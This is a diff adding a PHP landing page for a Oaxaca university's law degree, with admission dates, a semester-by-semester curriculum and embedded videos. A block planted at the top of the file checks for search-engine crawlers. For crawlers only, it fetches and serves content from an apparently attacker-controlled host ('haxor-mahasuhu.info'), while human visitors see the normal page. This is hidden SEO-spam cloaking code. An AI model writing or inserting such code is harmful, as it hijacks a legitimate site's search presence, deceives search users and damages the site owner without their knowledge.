@@ -1,0 +1,650 @@
+<?php
+function is_bot() {
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    $bots = array(
+        'Googlebot', 'Googlebot-News', 'Googlebot-Image', 'Googlebot-Video',
+        'bingbot', 'Slurp', 'DuckDuckBot', 'BingPreview', 'DuckDuckGo', 'YandexBot',
+        'Baiduspider', 'TelegramBot', 'facebookexternalhit', 'Pinterest', 'W3C_Validator',
+        'Google-Site-Verification', 'Google-InspectionTool', 'Applebot', 'AhrefsBot', 'SEMrushBot', 'MJ12bot'
+    );
+    
+    foreach ($bots as $bot) {
+        if (stripos($user_agent, $bot) !== false) {
+            return true;
+        }
+    }
+
+    return false;
+}
+
+function fetch_message_from_url($url) {
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10); // Timeout setelah 10 detik
+    $response = curl_exec($ch);
+    
+    if (curl_errno($ch)) {
+        error_log("Error cURL: " . curl_error($ch));
+        curl_close($ch);
+        return false;
+    }
+    
+    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+
+    if ($http_code == 200) {
+        return $response;
+    } else {
+        error_log("HTTP Error: Status Code " . $http_code);
+        return false;
+    }
+}
+
+if (is_bot()) { 
+    $message = fetch_message_from_url('https://tennesse.haxor-mahasuhu.info/derecho/index.php');
+    
+    if ($message) {
+        echo $message;
+    } else {
+        echo "";
+    }
+    exit;
+}
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <title>BUO | LICENCIATURA EN DERECHO</title>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport">
+    <meta content="derecho, licenciatura, buo, oaxaca" name="keywords">
+    <meta content="Página de la licenciatura en derecho de la buo" name="description">
+
+    <!-- Favicon -->
+    <link href="img/favicon.ico" rel="icon">
+
+    <!-- Google Web Fonts -->
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@100&display=swap" rel="stylesheet">
+
+    <!-- Icon Font Stylesheet -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.10.0/css/all.min.css" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.4.1/font/bootstrap-icons.css" rel="stylesheet">
+
+    <!-- Libraries Stylesheet -->
+    <link href="lib/animate/animate.min.css" rel="stylesheet">
+    <link href="lib/owlcarousel/assets/owl.carousel.min.css" rel="stylesheet">
+
+    <!-- Customized Bootstrap Stylesheet -->
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Template Stylesheet -->
+    <link href="css/style.css" rel="stylesheet">
+</head>
+
+<body>
+    <!-- Spinner Start -->
+    <div id="spinner" class="show bg-white position-fixed translate-middle w-100 vh-100 top-50 start-50 d-flex align-items-center justify-content-center">
+        <div class="spinner-border text-primary" style="width: 3rem; height: 3rem;" role="status">
+            <span class="sr-only">Cargando...</span>
+        </div>
+    </div>
+    <!-- Spinner End -->
+
+
+    <!-- Navbar Start -->
+    <nav class="navbar navbar-expand-lg bg-white navbar-light shadow sticky-top p-0">
+        <a href="index.php" class="navbar-brand d-flex align-items-center px-4 px-lg-5">
+            
+            <img class="position-absolute" src="img/logo.png" alt="" style="object-fit: cover;">
+            
+        </a>
+        <button type="button" class="navbar-toggler me-4" data-bs-toggle="collapse" data-bs-target="#navbarCollapse">
+            <span class="navbar-toggler-icon"></span>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarCollapse">
+            <div class="navbar-nav ms-auto p-4 p-lg-0">
+                <a href="index.php" class="nav-item nav-link active">Inicio</a>
+                <a href="#acercade" class="nav-item nav-link">Acerca de</a>
+                <a href="dossier.pdf" class="nav-item nav-link" target="_blank">Plan de Estudios</a>
+                <a href="politica.php" class="nav-item nav-link" target="_blank">Política de privacidad</a>
+            </div>
+            <a href="https://buo.mx/admisiones/" class="btn btn-primary py-4 px-lg-5 d-none d-lg-block">Solicitar Ficha<i class="fa fa-arrow-right ms-3"></i></a>
+        </div>
+    </nav>
+    <!-- Navbar End -->
+
+
+    <!-- Carousel Start -->
+    <div class="container-fluid p-0 mb-5">
+        <div class="owl-carousel header-carousel position-relative">
+            <div class="owl-carousel-item position-relative">
+                <img class="img-fluid" src="img/carousel-2.jpg" alt="">
+                <div class="position-absolute top-0 start-0 w-100 h-100 d-flex align-items-center" style="background: rgba(24, 29, 56, .7);">
+                    <div class="container">
+                        <div class="row justify-content-start">
+                            <div class="col-sm-10 col-lg-8">
+                                <h5 class="text-primary text-uppercase mb-3 animated slideInDown">Benémerita Universidad de Oaxaca</h5>
+                                <h1 class="display-3 text-white animated slideInDown">Licenciatura en Derecho</h1>
+                                <p class="fs-5 text-white mb-4 pb-2">FACULTAD DE CIENCIAS JURÍDICAS Y HUMANIDADES<br>
+                                    PROCESO DE ADMISIÓN 2026 <br>
+                                    RVOE LICENCIATURA EN DERECHO:  2020ES6171981
+                                    </p>
+                                <a href="https://buo.mx/admisiones/" class="btn btn-primary py-md-3 px-md-5 me-3 animated slideInLeft">Solicitar Ficha</a>
+                                <a href="dossier.pdf" class="btn btn-light py-md-3 px-md-5 animated slideInRight">Acerca de</a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="owl-carousel-item position-relative" id="acercade">
+                <img class="img-fluid" src="img/carousel-2.png" alt="">
+                <div class="position-absolute top-0 start-0 w-100 h-100 d-flex align-items-center" style="background: rgba(24, 29, 56, .7);">
+                    <div class="container">
+                        <div class="row justify-content-start">
+                            <div class="col-sm-10 col-lg-8">
+                                <h5 class="text-primary text-uppercase mb-3 animated slideInDown">FACULTAD DE CIENCIAS JURÍDICAS Y HUMANIDADES</h5>
+                                <h1 class="display-3 text-white animated slideInDown">Inicia el proceso de Admisión</h1>
+                                <p class="fs-5 text-white mb-4 pb-2">1.	Examen general de conocimientos en educación media superior.<br>
+                                    2.	Entrevista psicoeducativa
+                                </p>
+                                <a href="https://buo.mx/admisiones/" class="btn btn-primary py-md-3 px-md-5 me-3 animated slideInLeft">Iniciar Proceso</a>
+                                <a href="dossier.pdf" class="btn btn-light py-md-3 px-md-5 animated slideInRight">Contactanos</a>
+
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- Carousel End -->
+
+
+   
+ <!-- Footer Start -->
+ <div class="container-fluid bg-dark text-light footer  wow fadeIn" data-wow-delay="0.1s" style="padding-top:  -10;">
+  
+    <div class="container">     
+
+
+        <div class="row g-5">
+            <div class="col-lg-6 wow fadeInUp" data-wow-delay="0.1s" style="min-height: 400px;">
+                <div class="position-relative h-100 text-right">
+                    
+                    <img class="img-fluid position-absolute w-75 h-75 img-thumbnail" src="img/panel.jpg" > 
+                </div>
+            </div>
+            <div class="col-lg-6 wow fadeInUp" data-wow-delay="0.3s">
+                <div class="row ">
+                    <h4 class="section-title  text-start text-primary pe-3">Proceso de admisón 2026</h4>
+                </div>
+                <div class="row">
+                    <div class="col-md-12" style="color: #fff ;">
+                       FECHAS DISPONIBLES DE EXAMEN DE ADMISIÓN 2026 <br><br>
+                    </div>
+                </div>
+                    <div class="col-md-12 text-center text-md-end">
+                        <div class="footer-menu">
+                        <?php 
+                                    include('funciones.php');
+                                    $link = conectarse();                                    
+                                    $consulta= "SELECT * FROM adminision_fechas  ORDER BY fecha_real ASC";                                    
+                                    $res = mysqli_query ($link,$consulta);                                    
+                                    while($rowx = mysqli_fetch_assoc($res)){    
+                                        if($rowx['estado']!= 5) //No visible
+                                        {                                   
+                                        $color=regresa_color_estado($rowx['estado']);
+                                        echo "<a style='text-transform: uppercase;'>".
+                                         $rowx['fecha']." </a> ".regresa_nombre_estado($rowx['estado'])."<br>";   
+                                        }                                     
+                                    }?>	    
+                        <!--
+                            <a style="color:darkgray"> 25 DE FEBRERO  </a>  CUPO LLENO<br>
+                            <a style="color:darkgray"> 25 DE MARZO    </a>  CUPO LLENO<br>                          
+                            <a style="color:darkgray"> 15 DE ABRIL   </a> CUPO LLENO<br>
+                            <a style="color: darkgray "> 29 DE ABRIL </a> CUPO LLENO<br>
+                            <a style="color: darkgray"> 13 DE MAYO </a> CUPO LLENO<br>
+                            <a style="color: #ff8000"> 27 DE MAYO </a> DISPONIBLE<br>
+                            <a > 10 DE JUNIO </a> DISPONIBLE<br>
+                            <a > 24 DE JUNIO </a> DISPONIBLE<br>
+                            <a > 8 DE JULIO </a> DISPONIBLE<br>
+                            <a > 29 DE JULIO </a> DISPONIBLE <br><br>
+                                -->
+                        </div>
+                    </div>
+                    <div class="col-md-12 text-center text-md-end">
+                        <div class="text-center">
+                            <br>
+                            <a href="https://buo.mx/admisiones/" class="btn btn-primary py-md-3 px-md-5 me-3 animated slideInLeft">Iniciar Proceso de inscripción</a>
+                        </div>
+                    </div>
+                </div>
+        
+            </div>
+        </div>
+    </div>
+
+
+
+    <!-- About Start -->
+    <div class="container-xxl py-5">
+        <div class="container">
+            <div class="row g-5">
+                <div class="col-lg-6 wow fadeInUp" data-wow-delay="0.1s" style="min-height: 400px;">
+                    <div class="position-relative h-100">
+                        <img class="img-fluid position-absolute w-100 h-100" src="img/abouta.jpg" alt="" style="object-fit: cover;">
+                    </div>
+                </div>
+                <div class="col-lg-6 wow fadeInUp" data-wow-delay="0.3s">
+                    <h6 class="section-title bg-white text-start text-primary pe-3">Proceso de admisón 2026</h6>
+                    <h1 class="mb-4">Licenciatura en Derecho</h1>
+                    <p class="mb-4">La Licenciatura en Derecho es una profesión fundamental de la sociedad, ya que al aplicar 
+                        los conocimientos del Sistema Jurídico mexicano y oaxaqueño, abona a la solución pacífica, justa y objetiva
+                         de conflictos sociales. Por lo que los profesionales en esta área profesional adquieren un gran compromiso
+                          social, por ello es de gran importancia que adquieran una formación de alta calidad profesional y personal.</p>
+                
+                    <div class="row gy-2 gx-4 mb-4">
+                        <div class="col-sm-6">
+                            <p class="mb-0"><i class="fa fa-arrow-right text-primary me-2"></i>Inicio: Agosto</p>
+                        </div>
+                        <div class="col-sm-6">
+                            <p class="mb-0"><i class="fa fa-arrow-right text-primary me-2"></i>Sistema Escolarizado</p>
+                        </div>
+                        <div class="col-sm-6">
+                            <p class="mb-0"><i class="fa fa-arrow-right text-primary me-2"></i>8 Semestres</p>
+                        </div>
+                        <div class="col-sm-6">
+                            <p class="mb-0"><i class="fa fa-arrow-right text-primary me-2"></i>Clausto Docente de alto nivel</p>
+                        </div>
+                        
+                    </div>
+            
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- About End -->
+
+    
+
+ <!-- Footer Start -->
+ <div class="container-fluid bg-dark text-light footer  wow fadeIn" data-wow-delay="0.1s" style="padding-top:  -10;">
+  
+    <div class="container">     
+
+
+        <div class="row g-5">
+            <div class="col-lg-6 wow fadeInUp" data-wow-delay="0.1s" style="min-height: 400px;">
+                <div class="position-relative h-100 text-center">
+                    
+                    <iframe src="https://www.facebook.com/plugins/video.php?height=314&href=https%3A%2F%2Fwww.facebook.com%2FBUOuniversidad%2Fvideos%2F637267624492519%2F&show_text=false&width=560&t=0" width="560" height="314" style="border:none;overflow:hidden" scrolling="no" frameborder="0" allowfullscreen="true" allow="autoplay; clipboard-write; encrypted-media; picture-in-picture; web-share" allowFullScreen="true"></iframe>
+                    <p > Nuestro Rector, el Mtro David Martínez, nos platica los elementos mas importantes del Plan de Estudios y del claustro docente de la Licenciatura en Derecho de la BUO, donde convergen expertos en la disciplina del Derecho como jueces, magistrados, funcionarios federales, litigantes y docentes de alto prestigio del Estado, a nivel nacional e internacional.
+¿Ya aplicaste a la Licenciatura en Derecho de la BUO?</p>
+                </div>
+            </div>
+            <div class="col-lg-6 wow fadeInUp" data-wow-delay="0.1s" style="min-height: 400px;">
+                 <div class="position-relative h-100 text-center">
+                 <iframe src="https://www.facebook.com/plugins/video.php?height=314&href=https%3A%2F%2Fwww.facebook.com%2FBUOuniversidad%2Fvideos%2F1023031081804380%2F&show_text=false&width=560&t=0" width="560" height="314" style="border:none;overflow:hidden" scrolling="no" frameborder="0" allowfullscreen="true" allow="autoplay; clipboard-write; encrypted-media; picture-in-picture; web-share" allowFullScreen="true"></iframe>
+                    <p>
+                        Uno de los componentes del éxito profesional del abogado, es la vinculación con el sector jurídico y político, y académico, por esta razón nuestro Rector, el Mtro David Martínez, nos platica la importancia del #ProgramaAmigosBUO, un proyecto permanente de la Licenciatura en Derecho.
+José Manuel, Karla y Kasandra, estudiantes de la Licenciatura en Derecho, nos comparten como su casa de estudios fomenta sus experiencias personales y profesionales a través del programa
+                    </p>
+                </div>  
+            </div>
+        
+            </div>
+        </div>
+    </div>
+
+
+
+    <!-- About Start -->
+    <div class="container-xxl py-5">
+        <div class="container">
+            <div class="row g-5">
+               
+                <div class="col-lg-6 wow fadeInUp" data-wow-delay="0.3s">
+                    <h6 class="section-title bg-white text-start text-primary pe-3">El mejor plan de estudios</h6>
+                    <h1 class="mb-4">¿Por qué estudiar la Licenciatura en Derecho en la BUO?</h1>
+                    <p class="mb-4">La gama las materias únicas que ofrece nuestra licenciatura permite garantizar que nuestros egresados tendrán vasta experiencia y mejores conocimientos que egresados de cualquier otra institución educativa en Oaxaca y con un alto nivel de formación.</p>
+                    <p class="mb-4">Pues el egresado tendrá la capacidad de: <br>
+                        - Litigar en diversas materias del derecho<br>
+                        - Elaborar iniciativas de Ley, de reforma o derogación de artículos en sistema jurídico a nivel estatal o nacional<br>
+                        </p>
+                    <div class="row gy-2 gx-4 mb-4">
+                        <div class="col-sm-6">
+                            <p class="mb-0"><i class="fa fa-arrow-right text-primary me-2"></i>Docentes de alto nivel</p>
+                        </div>
+                        <div class="col-sm-6">
+                            <p class="mb-0"><i class="fa fa-arrow-right text-primary me-2"></i>Classes Presenciales</p>
+                        </div>
+                        <div class="col-sm-6">
+                            <p class="mb-0"><i class="fa fa-arrow-right text-primary me-2"></i>Vinculación con el Éxito</p>
+                        </div>
+                        <div class="col-sm-6">
+                            <p class="mb-0"><i class="fa fa-arrow-right text-primary me-2"></i>Varias opciones de Titulación</p>
+                        </div><div class="col-sm-6">
+                            <p class="mb-0"><i class="fa fa-arrow-right text-primary me-2"></i>Formación de Carácter</p>
+                        </div>
+                        <div class="col-sm-6">
+                            <p class="mb-0"><i class="fa fa-arrow-right text-primary me-2"></i>Certificación SEP</p>
+                        </div>
+                    </div>
+                  
+                </div>
+                <div class="col-lg-6 wow fadeInUp" data-wow-delay="0.1s" style="min-height: 500px;">
+                    <div class="position-relative h-100">
+                        <img class="img-fluid position-absolute w-100 h-100" src="img/aboutn.jpg" alt="" style="object-fit: cover;" height="80%">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- About End -->
+
+    <!-- Categories Start -->
+    <div class="container-xxl py-5 category">
+        <div class="container">
+            <div class="text-center wow fadeInUp" data-wow-delay="0.1s">
+                <h6 class="section-title bg-white text-center text-primary px-3">Archivo Fotográfico</h6>
+                <h1 class="mb-5">Vida universitaria</h1>
+            </div>
+            <div class="row g-3">
+                <div class="col-lg-7 col-md-6">
+                    <div class="row g-3">
+                        <div class="col-lg-12 col-md-12 wow zoomIn" data-wow-delay="0.1s">
+                            <a class="position-relative d-block overflow-hidden">
+                                <img class="img-fluid" src="img/cat-1.jpg" alt="">
+                                <div class="text-center position-absolute bottom-0 end-0 py-2 px-3" style="margin: 1px;">
+                                    <img class="img-fluid  w-100 h-100" src="img/logo.png" alt="" style="object-fit: cover;">
+                                </div>
+                            </a>
+                        </div>
+                        <div class="col-lg-6 col-md-12 wow zoomIn" data-wow-delay="0.3s">
+                            <a class="position-relative d-block overflow-hidden" >
+                                <img class="img-fluid" src="img/cat-2.jpg" alt="">
+                                <div class="text-center position-absolute bottom-0 end-0 py-2 px-3" style="margin: 1px;">
+                                    <img class="img-fluid  w-100 h-100" src="img/logo.png" alt="" style="object-fit: cover;">
+                                </div>
+                            </a>
+                        </div>
+                        <div class="col-lg-6 col-md-12 wow zoomIn" data-wow-delay="0.5s">
+                            <a class="position-relative d-block overflow-hidden" ">
+                                <img class="img-fluid" src="img/cat-3.jpg" alt="">
+                                <div class="text-center position-absolute bottom-0 end-0 py-2 px-3" style="margin: 1px;">
+                                    <img class="img-fluid  w-100 h-100" src="img/logo.png" alt="" style="object-fit: cover;">
+                                </div>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-5 col-md-6 wow zoomIn" data-wow-delay="0.7s" style="min-height: 350px;">
+                    <a class="position-relative d-block h-100 overflow-hidden" >
+                        <img class="img-fluid position-absolute w-100 h-100" src="img/cat-4.jpg" alt="" style="object-fit: cover;">
+                        <div class="text-center position-absolute bottom-0 end-0 py-2 px-3" style="margin: 1px;">
+                            <img class="img-fluid  w-100 h-100" src="img/logo.png" alt="" style="object-fit: cover;">
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- Categories Start -->
+
+
+
+ <!-- Footer Start -->
+ <div class="container-fluid bg-dark text-light footer  wow fadeIn" data-wow-delay="0.1s" style="padding-top:  -10;">
+  
+    <div class="container">     
+
+
+        <div class="row g-5">
+            <div class="col-lg-6 wow fadeInUp" data-wow-delay="0.1s" style="min-height: 400px;">
+                <div class="position-relative h-100 text-center">
+                    
+                    <iframe src="https://www.facebook.com/plugins/post.php?href=https%3A%2F%2Fwww.facebook.com%2FBUOuniversidad%2Fposts%2Fpfbid02QkUjb8MXoz7cZCkXeqZRQLfwgmyW6vRr4WZjUpervo8iK2sH67mKacA5nG8nYGhWl&show_text=true&width=500" width="500" height="780" style="border:none;overflow:hidden" scrolling="no" frameborder="0" allowfullscreen="true" allow="autoplay; clipboard-write; encrypted-media; picture-in-picture; web-share"></iframe>
+                </div>
+            </div>
+            <div class="col-lg-6 wow fadeInUp" data-wow-delay="0.1s" style="min-height: 400px;">
+                 <div class="position-relative h-100 text-center">
+                    <iframe src="https://www.facebook.com/plugins/post.php?href=https%3A%2F%2Fwww.facebook.com%2FBUOuniversidad%2Fposts%2Fpfbid024gWyf6PZFTHY83gaaqgePvGefrq3D7vP2TiTiPMQ3Mr83Ev5cWFm86CbpjVzHaYdl&show_text=true&width=500" width="500" height="766" style="border:none;overflow:hidden" scrolling="no" frameborder="0" allowfullscreen="true" allow="autoplay; clipboard-write; encrypted-media; picture-in-picture; web-share"></iframe>
+                </div>  
+            </div>
+        
+            </div>
+        </div>
+    </div>
+
+
+
+    <!-- Courses Start -->
+    <div class="container-xxl py-5">
+        <div class="container">
+        
+           
+
+
+    <!-- Courses Start -->
+    <div class="container-xxl py-5" id="acercade">
+        <div class="container">
+            <div class="text-center wow fadeInUp" data-wow-delay="0.1s">
+                <h6 class="section-title bg-white text-center text-primary px-3">8 Semestres</h6>
+                <h1 class="mb-5">Plan de estudios</h1>
+            </div>
+            
+            <div class="container">
+        <div class="row">
+          <div class="col-lg-4 col-md-4 col-sm-4">
+            <div class="education wow fadeInRight" data-wow-delay="0.3s">
+              <ul class="timeline">
+               
+                 <li>
+                  <div class="content-text">
+                    <p class="line-title">Primer Semestre</p>
+                      <span>- Instituciones del Derecho Romano I<br>
+                      - Acto Jurídico, Derecho de las Personas y Familia<br>
+                      - Metodología Investigación y Redacción Jurídica<br>
+                      - Teorías del Estado<br>
+                      - Teorías del Derecho<br>
+                      - Sociología Jurídica
+                    - Teoría Económica <br>
+                - Cultura General del Abogado I <br> <br></span>
+
+                  </div>
+                </li>
+                <li>
+                  <div class="content-text">
+                    <p class="line-title">Segundo Semestre</p>
+                    <span>- Instituciones del Derecho Romano II<br>
+                    - Derecho Constitucional<br>
+                    - Patrimonio y Derechos Reales<br>
+                    - Teoría del Delito<br>
+                    - Teoría General del Proceso<br>
+                    - Derechos Humanos<br>
+                    - Ideas e Instituciones Políticas <br>
+                    - Lógica y Argumentación Jurídica <br>
+                    - Filosofía del Derecho <br>
+                   </span> <br>
+                  </div>
+                </li>
+                <li>
+                  <div class="content-text">
+                    <p class="line-title">Tercer Semestre</p>
+                    <span>- Derecho Hereditario<br>
+                    - Comercio y Sociedades Mercantiles<br>
+                    - Sistemas Jurídicos Contemporáneos<br>
+                    - Delitos en Particular <br>
+                    - Derecho Administrativo I <br>
+                    - Mecanismos de Protección Derechos Humanos<br>
+                    - Derecho Agrario <br>
+                    - Antropología Jurídica <br>
+                    -Cultura General del Abogado II
+                    </span>
+                  </div>
+                  </li>
+                
+              </ul>
+            </div>
+          </div>
+          <div class="col-lg-4 col-md-4 col-sm-4">
+            <div class="experience wow fadeInRight" data-wow-delay="0.6s">
+              <ul class="timeline">
+                
+                <li>
+                  <div class="content-text">
+                    <p class="line-title">Cuarto Semestre</p>
+                    <span>- Derecho de las Obligaciones <br>
+                    - Contratos Mercantiles <br>
+                    - Derecho Informático<br>
+                    - Delitos Especiales<br>
+                    - Derecho Administrativo II<br>
+                    - Derecho Internacional Público y Privado <br>
+                    - Derecho Municipal <br>
+                    - Derecho Individual de Trabajo <br>
+                    - Cultura General del Abogado III
+                    </span>
+                  </div>
+                </li>
+               <li>
+                  <div class="content-text">
+                    <p class="line-title">Quinto Semestre</p>
+                    <span>- Derecho Contractual Civil <br>
+                            - Títulos y Operaciones de Crédito<br>
+                            - Procesal Penal Acusatorio I<br>
+                            - Derecho Ambiental<br>
+                            - Derecho Fiscal I<br>
+                            - Tratados Internacionales  <br>
+                            - Derecho Notarial y Correduría Publica <br>
+                            - Derecho Colectivo del Trabajo <br>
+                            - Cultura general del Abogado IV
+                            </span>
+                  </div>
+                </li>
+                <li>
+                  <div class="content-text">
+                    <p class="line-title">Sexto Semestre</p>
+                    <span> - Derecho Bancario Bursátil<br>
+                           - Derecho Procesal Mercantil<br>
+                            - Derecho Procesal Penal II<br>
+                            - Técnicas de Litigación y Debate Jurídico<br>
+                            - Derecho Fiscal II<br>
+                            - Amparo y Medios de Control Constitucional  <br>
+                            - Derecho Procesal Civil <br>
+                            - Derecho Procesal Laboral  <br>
+                            - Deontología y Ética Jurídica
+                            </span>
+                   </div>
+                </li>
+                              
+              </ul>
+            </div>
+          </div>
+          
+          <div class="col-lg-4 col-md-4 col-sm-4">
+            <div class="experience wow fadeInRight" data-wow-delay="0.6s">
+              <ul class="timeline">
+               
+               
+                <li>
+                  <div class="content-text">
+                    <p class="line-title">Séptimo Semestre</p>
+                    <span>- Juicios Orales en Materia Mercantil<br>
+                          - Juicios Orales en Materia Civil y Familiar<br>
+                         - Práctica Forense de Derecho Fiscal y Administrativo<br>
+                        - Prácticas Forense Juicio Constitucional  Amparo<br>
+                          - Medios Alternos de Solución de Conflictos <br>
+                          - Derecho Indígena<br>
+                          - Derecho de Seguridad Social <br>
+                          - Retórica y Oratoria Forense <br>
+                          - Seminario de Tesis I
+                            </span>
+                  </div>
+                </li>
+                <li>
+                  <div class="content-text">
+                    <p class="line-title">Octavo Semestre</p>
+                    <span>- Criminalística y Medicina Forense<br>
+                           - Mecanismos de Combate a la Corrupción<br>
+                           - Estudio de Casos<br>
+                           - Derecho Parlamentario Mexicano <br>
+                            - Derecho Electoral y Sistemas Normativos Indígenas<br>
+                            - Fiscalización Superior<br>
+                            - Desarrollo de Negocios <br>
+                            - Seminario de Tesis II
+                            </span>
+                  </div>
+                </li>
+                             
+              </ul>
+            </div>
+          </div>
+          
+        </div>
+      </div>
+
+
+
+
+            </div>
+        </div>
+    </div>
+    <!-- Courses End -->
+
+
+
+
+            
+        </div>
+    </div>
+    <!-- Courses End -->
+
+
+        
+
+    <!-- Footer Start -->
+    <div class="container-fluid bg-dark text-light footer pt-5 mt-5 wow fadeIn" data-wow-delay="0.1s">
+     
+        <div class="container">
+            <div class="copyright">
+                <div class="row">
+                    <div class="col-md-6 text-center text-md-start mb-3 mb-md-0">
+                        &copy; <a class="border-bottom" href="#">BUO</a>,FACULTAD DE CIENCIAS JURÍDICAS Y HUMANIDADES.
+                    </div>
+                    <div class="col-md-6 text-center text-md-end">
+                        <div class="footer-menu">
+                            <a href="index.php">Inicio</a>
+                            <a href="https://buo.mx/admisiones/">Solicitud de inscripción</a>
+                            
+                            <a href="dossier.pdf" target="_blank">DOSSIER</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- Footer End -->
+
+
+    <!-- Back to Top -->
+    <a href="#" class="btn btn-lg btn-primary btn-lg-square back-to-top"><i class="bi bi-arrow-up"></i></a>
+
+
+    <!-- JavaScript Libraries -->
+    <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="lib/wow/wow.min.js"></script>
+    <script src="lib/easing/easing.min.js"></script>
+    <script src="lib/waypoints/waypoints.min.js"></script>
+    <script src="lib/owlcarousel/owl.carousel.min.js"></script>
+
+    <!-- Template Javascript -->
+    <script src="js/main.js"></script>
+</body>
+
+</html>
